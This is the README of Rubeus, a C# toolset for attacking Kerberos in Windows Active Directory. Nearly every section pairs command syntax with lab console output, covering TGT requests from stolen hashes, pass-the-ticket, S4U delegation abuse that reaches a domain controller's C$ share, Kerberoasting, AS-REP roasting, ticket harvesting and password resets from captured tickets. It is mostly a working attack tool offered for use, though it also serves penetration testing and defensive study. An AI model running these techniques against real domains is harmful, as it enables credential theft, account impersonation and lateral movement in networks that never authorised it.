# Rubeus

----

Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.

Rubeus also uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an "MIT-like" license. Huge thanks to Thomas for his clean and stable code!

The [KerberosRequestorSecurityToken.GetRequest](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method for Kerberoasting was contributed to PowerView by [@machosec](https://twitter.com/machosec).

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base.

Rubeus is licensed under the BSD 3-Clause license.


## Usage

    Ticket requests and renewals:

        Retrieve a TGT based on a user password/hash, optionally applying to the current logon session or a specific LUID:
            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] | /rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]

        Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] |/rc4:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]

        Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]

        Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:
            Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]


    Constrained delegation abuse:

        Perform S4U constrained delegation abuse:
            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]


    Ticket management:

        Submit a TGT, optionally targeting a specific LUID (if elevated):
            Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]

        Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
            Rubeus.exe purge [/luid:LOGINID]

        Parse and describe a ticket (service ticket or TGT):
            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>


    Ticket extraction and harvesting:

        Triage all current tickets on the system (if elevated), optionally targeting a specific LUID, username, or service:
            Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:LDAP]

        List all current tickets (if elevated, list for all users), optionally targeting a specific LUID:
            Rubeus.exe klist [/luid:LOGINID]

        Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
            Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]

        Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
            Rubeus.exe tgtdeleg [/target:SPN]

        Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
            Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER] [/registry:SOFTWARENAME]

        Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
            Rubeus.exe harvest [/interval:MINUTES] [/registry:SOFTWARENAME]


    Roasting:

        Perform Kerberoasting:
            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]

        Perform Kerberoasting, outputting hashes to a file:
            Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]

        Perform Kerberoasting with alternate credentials:
            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]

        Perform AS-REP "roasting" for any users without preauth:
            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]

        Perform AS-REP "roasting" for any users without preauth, outputting hashes to a file:
            Rubeus.exe asreproast /outfile:hashes.txt [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]

        Perform AS-REP "roasting" for any users without preauth using alternate credentials:
            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]


    Miscellaneous:

        Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]

        Reset a user's password from a supplied TGT (AoratoPw):
            Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]


    NOTE: Base64 ticket blobs can be decoded with :

        [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))


## asktgt

The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (/rc4 or /aes256). A /password flag can also be used instead of a hash. If no /domain is specified, the computer's current domain is extracted, and if no /dc is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The /luid:X flag will apply the ticket to the specified logon session ID (elevation needed).

Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the /ptt option. A workaround is to use the **/createnetonly:X** parameter, or request the ticket and apply it to another logon session with **ptt /luid:X**.

    c:\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.0.0

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1537 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
        ...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!


    C:\Rubeus>Rubeus.exe asktgt /user:harmj0y /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /createnetonly:C:\Windows\System32\cmd.exe

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0


    [*] Action: Create Process (/netonly)

    [*] Showing process : False
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 4988
    [+] LUID            : 6241024

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Target LUID : 6241024
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\harmj0y'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 232 bytes
    [*] Received 1405 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

          doIFFjCCBRKgAwIB...(snip)...

    [*] Action: Import Ticket
    [*] Target LUID: 0x5f3b00
    [+] Ticket successfully imported!

**Note that the /luid and /createnetonly parameters require elevation!**


## asktgs

The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The /ptt flag will "pass-the-ticket" and apply the resulting service ticket to the current logon session. One or more /service:X SPNs must be specified, comma separated.

    C:\Temp\tickets>Rubeus.exe asktgt /user:harmj0y /rc4:2b576acbe6bcfda7294d6bd18041b8fe

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\harmj0y'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 232 bytes
    [*] Received 1405 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

          doIFFjCCBRKgAwIBBa...(snip)...

    C:\Temp\tickets>Rubeus.exe asktgs /ticket:doIFFjCCBRKgAwIBBa...(snip...)== /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: Ask TGS

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ request for: 'LDAP/primary.testlab.local'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1384 bytes
    [*] Received 1430 bytes
    [+] TGS request successful!
    [*] base64(ticket.kirbi):

          doIFSjCCBUagAwIBBaEDA...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!

    [*] Action: Ask TGS

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ request for: 'cifs/primary.testlab.local'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1384 bytes
    [*] Received 1430 bytes
    [+] TGS request successful!
    [*] base64(ticket.kirbi):

          doIFSjCCBUagAwIBBaEDAgE...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!


    C:\Temp\tickets>C:\Windows\System32\klist.exe tickets

    Current LogonId is 0:0x570ba

    Cached Tickets: (2)

    #0>     Client: harmj0y @ TESTLAB.LOCAL
            Server: cifs/primary.testlab.local @ TESTLAB.LOCAL
            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
            Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
            Start Time: 9/30/2018 18:17:55 (local)
            End Time:   9/30/2018 23:17:01 (local)
            Renew Time: 10/7/2018 18:17:01 (local)
            Session Key Type: AES-128-CTS-HMAC-SHA1-96
            Cache Flags: 0
            Kdc Called:

    #1>     Client: harmj0y @ TESTLAB.LOCAL
            Server: LDAP/primary.testlab.local @ TESTLAB.LOCAL
            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
            Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
            Start Time: 9/30/2018 18:17:55 (local)
            End Time:   9/30/2018 23:17:01 (local)
            Renew Time: 10/7/2018 18:17:01 (local)
            Session Key Type: AES-128-CTS-HMAC-SHA1-96
            Cache Flags: 0
            Kdc Called:


## renew

The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.

Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.

    c:\Rubeus>Rubeus.exe renew /ticket:doIFmjCC...(snip)...

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.0.0

    [*] Action: Renew TGT

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1500 bytes
    [*] Received 1510 bytes
    [+] TGT renewal request successful!
    [*] base64(ticket.kirbi):

        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
        ...(snip)...

The **/autorenew** flag will take an existing /ticket .kirbi file, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.

    C:\Rubeus>Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: Auto-Renew TGT


    [*] User       : harmj0y@TESTLAB.LOCAL
    [*] endtime    : 9/24/2018 3:34:05 AM
    [*] renew-till : 9/30/2018 10:34:05 PM
    [*] Sleeping for 165 minutes (endTime-30) before the next renewal
    [*] Renewing TGT for harmj0y@TESTLAB.LOCAL

    [*] Action: Renew TGT

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\harmj0y'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1370 bytes
    [*] Received 1378 bytes
    [+] TGT renewal request successful!
    [*] base64(ticket.kirbi):

          doIFFjCCBRKg...(snip)...


    [*] User       : harmj0y@TESTLAB.LOCAL
    [*] endtime    : 9/24/2018 8:03:55 AM
    [*] renew-till : 9/30/2018 10:34:05 PM
    [*] Sleeping for 269 minutes (endTime-30) before the next renewal


## changepw

The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified /new:X value. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's misc::changepw function.

    C:\Temp\tickets>Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.2.0

    [*] Action: Reset User Password (AoratoPw)

    [*] Changing password for user: harmj0y@TESTLAB.LOCAL
    [*] New password value: Password123!
    [*] Building AP-REQ for the MS Kpassword request
    [*] Building Authenticator with encryption key type: rc4_hmac
    [*] base64(session subkey): nX2FOQ3RsGxoI8uqIg1zlg==
    [*] Building the KRV-PRIV structure
    [*] Connecting to 192.168.52.100:464
    [*] Sent 1347 bytes
    [*] Received 167 bytes
    [+] Password change success!


## s4u

The **s4u** action is nearly identical to Kekeo's **tgs::s4u** functionality. If a user (or computer) account is configured for constrained delegation (i.e. has a SPN value in its msds-allowedtodelegateto field), this action can be used to abuse access to the target SPN/server.

First, a valid TGT/KRB-CRED file is needed for the account with constrained delegation configured. This can be achieved with the **asktgt** action, given the NTLM/RC4 or the aes256_cts_hmac_sha1 hash of the account.

The ticket is then supplied to the **s4u** action via /ticket (again, either as a base64 blob or a ticket file on disk), along with a required /impersonateuser:X to impersonate to the /msdsspn:SERVICE/SERVER SPN that is configured in the account's msds-allowedToDelegateTo field. The /dc and /ptt parameters function the same as in previous actions.

The /altservice parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (/altservice:cifs,HOST,...).

Alternatively, instead of providing a /ticket, a /user:X and either a /rc4:X or /aes256:X hash specification (/domain:X optional) can be used similarly to the **asktgt** action to first request a TGT for /user with constrained delegation configured, which is then used for the s4u exchange.

    c:\Temp\tickets>Rubeus.exe asktgt /user:patsy /domain:testlab.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1377 bytes
    [*] base64(ticket.kirbi):

          doIE+jCCBPagAwIBBaE...(snip)...

    c:\Temp\tickets>Rubeus.exe s4u /ticket:C:\Temp\Tickets\patsy.kirbi /impersonateuser:dfm.a /msdsspn:ldap/primary.testlab.local /altservice:cifs /ptt

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: S4U

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building S4U2self request for: 'TESTLAB.LOCAL\patsy'
    [*]   Impersonating user 'dfm.a' to target SPN 'ldap/primary.testlab.local'
    [*]   Final ticket will be for the alternate service 'cifs'
    [*] Sending S4U2self request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1437 bytes
    [*] Received 1574 bytes
    [+] S4U2self success!
    [*] Building S4U2proxy request for service: 'ldap/primary.testlab.local'
    [*] Sending S4U2proxy request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 2618 bytes
    [*] Received 1798 bytes
    [+] S4U2proxy success!
    [*] Substituting alternative service name 'cifs'
    [*] base64(ticket.kirbi):

          doIGujCCBragAwIBBaEDAgE...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!

Alternatively using a /user and /rc4 :

    C:\Temp\tickets>dir \\primary.testlab.local\C$
    The user name or password is incorrect.

    C:\Temp\tickets>Rubeus.exe s4u /user:patsy /domain:testlab.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6 /impersonateuser:dfm.a /msdsspn:LDAP/primary.testlab.local /altservice:cifs /ptt

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1377 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

          doIE+jCCBPagAwIBBaEDAg...(snip)...

    [*] Action: S4U

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building S4U2self request for: 'TESTLAB.LOCAL\patsy'
    [*]   Impersonating user 'dfm.a' to target SPN 'LDAP/primary.testlab.local'
    [*]   Final ticket will be for the alternate service 'cifs'
    [*] Sending S4U2self request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1437 bytes
    [*] Received 1574 bytes
    [+] S4U2self success!
    [*] Building S4U2proxy request for service: 'LDAP/primary.testlab.local'
    [*] Sending S4U2proxy request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 2618 bytes
    [*] Received 1798 bytes
    [+] S4U2proxy success!
    [*] Substituting alternative service name 'cifs'
    [*] base64(ticket.kirbi):

          doIGujCCBragAwIBBaE...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!

    C:\Temp\tickets>dir \\primary.testlab.local\C$
     Volume in drive \\primary.testlab.local\C$ has no label.
     Volume Serial Number is A48B-4D68

     Directory of \\primary.testlab.local\C$

    03/05/2017  05:36 PM    <DIR>          inetpub
    08/22/2013  08:52 AM    <DIR>          PerfLogs
    04/15/2017  06:25 PM    <DIR>          profiles
    08/28/2018  12:51 PM    <DIR>          Program Files
    08/28/2018  12:51 PM    <DIR>          Program Files (x86)
    08/23/2018  06:47 PM    <DIR>          Temp
    08/23/2018  04:52 PM    <DIR>          Users
    08/23/2018  06:48 PM    <DIR>          Windows
                   8 Dir(s)  40,679,706,624 bytes free


## ptt

The **ptt** action will submit a /ticket (TGT or service ticket) for the current logon session through the LsaCallAuthenticationPackage() API with a KERB_SUBMIT_TKT_REQUEST message, or (if elevated) to the logon session specified by /luid:X. Like other /ticket:X parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.

    c:\Rubeus>Rubeus.exe ptt /ticket:doIFmj...(snip)...

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.0.0


    [*] Action: Import Ticket
    [+] Ticket successfully imported!

**Note that the /luid parameter requires elevation!**


## purge

The **purge** action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by /luid:X.

    C:\Temp\tickets>Rubeus.exe purge

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0


    [*] Action: Purge Tickets
    [+] Tickets successfully purged!

    C:\Temp\tickets>Rubeus.exe purge /luid:34008685

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0


    [*] Action: Purge Tickets
    [*] Target LUID: 0x206ee6d
    [+] Tickets successfully purged!

**Note that the /luid parameter requires elevation!**


## describe

The **describe** action takes a /ticket:X value (TGT or service ticket), parses it, and describes the values of the ticket. Like other /ticket:X parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.

    c:\Rubeus>Rubeus.exe describe /ticket:doIFmjCC...(snip)...

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0


    [*] Action: Display Ticket

      UserName              :  dfm.a
      UserRealm             :  TESTLAB.LOCAL
      ServiceName           :  krbtgt
      ServiceRealm          :  TESTLAB.LOCAL
      StartTime             :  9/17/2018 6:51:00 PM
      EndTime               :  9/17/2018 11:51:00 PM
      RenewTill             :  9/24/2018 4:22:59 PM
      Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
      KeyType               :  rc4_hmac
      Base64(key)           :  2Bpbt6YnV5PFdY7YTo2hyQ==


## createnetonly

The **createnetonly** action will use the CreateProcessWithLogonW() API to create a new hidden (unless /show is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the ptt /luid:X parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.

    C:\Rubeus>Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe"

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0


    [*] Action: Create Process (/netonly)

    [*] Showing process : False
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 9060
    [+] LUID            : 6290874


## kerberoast

The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket. Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.

With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The /spn:X argument roasts just the specified SPN, the /user:X argument roasts just the specified user, and the /ou:X argument roasts just users in the specific OU.

The /outfile:FILE argument outputs roasted hashes to the specified file, one per line.

Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with /creduserDOMAIN.FQDN\USER /credpassword:PASSWORD.

    c:\Rubeus>Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: Kerberoasting

    [*] SamAccountName         : testuser2
    [*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
    [*] ServicePrincipalName   : service/host
    [*] Hash                   : $krb5tgs$5$*$testlab.local$service/host*$95160F02CA8EB...(snip)...

    ...(snip)...


    C:\Rubeus>Rubeus.exe kerberoast /outfile:hashes.txt

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.3.2

    [*] Action: Kerberoasting

    [*] SamAccountName         : harmj0y
    [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : asdf/asdfasdf
    [*] Hash written to C:\Temp\hashes.txt


    [*] SamAccountName         : sqlservice
    [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
    [*] Hash written to C:\Temp\hashes.txt

    ...(snip)...


## asreproast

The **asreproast** action replaces the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project which executed similar actions with the (larger sized) [BouncyCastle](https://www.bouncycastle.org/) library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting.

With no other arguments, all user accounts with Kerberos preauth not required are roasted. The /user:X argument roasts just the specified user, and the /ou:X argument roasts just users in the specific OU. The /domain and /dc arguments are optional, pulling system defaults as other actions do.

The /outfile:FILE argument outputs roasted hashes to the specified file, one per line.

Also, if you wanted to use alternate domain credentials for roasting, that can be specified with /creduserDOMAIN.FQDN\USER /credpassword:PASSWORD.

The output format is John the Ripper ([Jumbo version](https://github.com/magnumripper/JohnTheRipper)) compatible, with Hashcat support coming soon.

    c:\Rubeus>Rubeus.exe asreproast /user:dfm.a

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: AS-REP Roasting

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 163 bytes
    [*] Received 1537 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

          $krb5asrep$dfm.a@testlab.local:F7310EA341128...(snip)...


    C:\Rubeus>Rubeus.exe asreproast

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.3.2

    [*] Action: AS-REP roasting

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 163 bytes
    [*] Received 1537 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$dfm.a@testlab.local:F5432...(snip)...

